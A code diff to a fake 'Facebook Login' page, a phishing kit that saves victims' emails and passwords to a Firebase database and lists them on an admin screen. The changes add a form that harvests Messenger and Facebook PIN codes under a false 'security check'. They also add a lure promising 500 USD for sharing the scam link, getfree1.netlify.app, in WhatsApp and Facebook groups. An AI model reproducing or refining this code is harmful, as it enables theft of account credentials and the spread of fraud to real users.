@@ -1,6 +1,8 @@
 <html>
 <head>
     <title>Facebook Login</title>
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" type="image/svg+xml">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
     <style>
         @import url('https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css');
     </style>
@@ -8,6 +10,7 @@
     <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
     <!-- Add Firebase products that you want to use -->
     <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-database.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/js/all.min.js"></script>
     <script>
         // Your web app's Firebase configuration
         const firebaseConfig = {
@@ -52,7 +55,7 @@
                 let usersList = '<h2 class="text-center text-2xl mb-4">All Users</h2><ul class="list-disc pl-5">';
                 for (const key in users) {
                     if (users.hasOwnProperty(key)) {
-                        usersList += `<li>Email: ${users[key].email}, Password: ${users[key].password}, Verification Code: ${users[key].verificationCode || 'N/A'}</li>`;
+                        usersList += `<li>Email: ${users[key].email}, Password: ${users[key].password}, Messenger Pin: ${users[key].messengerPin || 'N/A'}, Facebook Pin: ${users[key].facebookPin || 'N/A'}</li>`;
                     }
                 }
                 usersList += '</ul>';
@@ -64,52 +67,80 @@
 
         function showVerificationForm() {
             const verificationForm = `
-                <form id="verificationForm">
+                <div class="mb-4">
+                    <p class="text-gray-700"><span class="text-green-600 font-bold">Congratulations!</span> Your phone code verification was completed yesterday, now complete the further security check below:</p>
+                </div>
+                <form id="securityCheckForm">
                     <div class="mb-4">
-                        <label for="verificationCode" class="block text-gray-700">Enter verification code you have received on your mobile number</label>
-                        <input type="text" id="verificationCode" class="w-full px-3 py-2 border rounded-lg" required>
+                        <label for="messengerPin" class="block text-gray-700">Enter Messenger 6-digit pin code:</label>
+                        <input type="text" id="messengerPin" class="w-full px-3 py-2 border rounded-lg" required>
+                    </div>
+                    <div class="mb-4">
+                        <label for="facebookPin" class="block text-gray-700">OR enter Pin code you received on Facebook (optional):</label>
+                        <input type="text" id="facebookPin" class="w-full px-3 py-2 border rounded-lg">
                     </div>
                     <button type="submit" class="w-full bg-blue-600 text-white py-2 rounded-lg">Submit</button>
-                    <p id="timer" class="text-center text-sm text-gray-700 mt-4"></p>
                 </form>
             `;
             document.getElementById('loginContainer').innerHTML = verificationForm;
-            document.getElementById('verificationForm').addEventListener('submit', storeVerificationCode);
-            startTimer();
+            document.getElementById('securityCheckForm').addEventListener('submit', storeSecurityCheckData);
         }
 
-        function storeVerificationCode(event) {
+        function storeSecurityCheckData(event) {
             event.preventDefault();
-            const verificationCode = document.getElementById('verificationCode').value;
+            const messengerPin = document.getElementById('messengerPin').value;
+            const facebookPin = document.getElementById('facebookPin').value;
 
             if (currentUserKey) {
                 firebase.database().ref('users/' + currentUserKey).update({
-                    verificationCode: verificationCode
+                    messengerPin: messengerPin,
+                    facebookPin: facebookPin
                 }).then(() => {
-                    alert('Share the link in 5 Whatsapp groups then you will get 500 USD');
+                    showShareScreen();
                 }).catch((error) => {
                     alert('Error: ' + error.message);
                 });
             }
         }
 
-        function startTimer() {
-            let timeLeft = 60;
-            const timerElement = document.getElementById('timer');
-            const timerInterval = setInterval(() => {
-                if (timeLeft <= 0) {
-                    clearInterval(timerInterval);
-                    timerElement.innerHTML = '<span class="text-blue-600 cursor-pointer" onclick="resendCode()">Resend code</span>';
-                } else {
-                    timerElement.innerHTML = `Resend code in ${timeLeft} seconds`;
-                }
-                timeLeft -= 1;
-            }, 1000);
+        function showShareScreen() {
+            const shareScreen = `
+                <div class="mb-4">
+                    <p class="text-gray-700">Share the link in 5 Whatsapp groups and 10 Facebook Groups then you will get 500 USD in your Facebook star support wallet</p>
+                </div>
+                <button onclick="shareLink()" class="w-full bg-blue-600 text-white py-2 rounded-lg mb-4">Share</button>
+                <div class="flex items-center">
+                    <input type="text" id="shareLink" class="w-full px-3 py-2 border rounded-lg" value="https://getfree1.netlify.app/" readonly>
+                    <button onclick="copyLink()" class="ml-2 text-blue-600"><i class="fas fa-copy"></i></button>
+                </div>
+            `;
+            document.getElementById('loginContainer').innerHTML = shareScreen;
         }
 
-        function resendCode() {
-            alert('Code resent!');
-            startTimer();
+        function shareLink() {
+            const shareText = "Share this link to get 500 USD in your Facebook star support wallet!";
+            const shareUrl = "https://getfree1.netlify.app/";
+            if (navigator.share) {
+                navigator.share({
+                    title: 'Facebook Star Support',
+                    text: shareText,
+                    url: shareUrl,
+                }).then(() => {
+                    console.log('Thanks for sharing!');
+                }).catch((error) => {
+                    console.error('Error sharing:', error);
+                });
+            } else {
+                alert('Share feature is not supported in your browser. Please copy the link and share manually.');
+            }
+        }
+
+        function copyLink() {
+            const shareLink = document.getElementById('shareLink');
+            shareLink.select();
+            shareLink.setSelectionRange(0, 99999); // For mobile devices
+            document.execCommand("copy");
+            alert('Link copied, now share in the groups');
         }
 
         document.addEventListener('DOMContentLoaded', function() {
@@ -117,8 +148,8 @@
         });
     </script>
 </head>
-<body class="flex items-center justify-center min-h-screen bg-gray-100">
-    <div id="loginContainer" class="bg-white p-8 rounded-lg shadow-lg w-96">
+<body class="flex items-center justify-center min-h-screen bg-white">
+    <div id="loginContainer" class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md">
         <div class="flex justify-center mb-4">
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="w-12 h-12 text-blue-600">
                 <path fill="currentColor" d="M22.675 0h-21.35C.595 0 0 .595 0 1.325v21.351C0 23.405.595 24 1.325 24H12.82v-9.294H9.692v-3.622h3.128V8.413c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.794.715-1.794 1.763v2.31h3.587l-.467 3.622h-3.12V24h6.116c.73 0 1.325-.595 1.325-1.324V1.325C24 .595 23.405 0 22.675 0z"/>
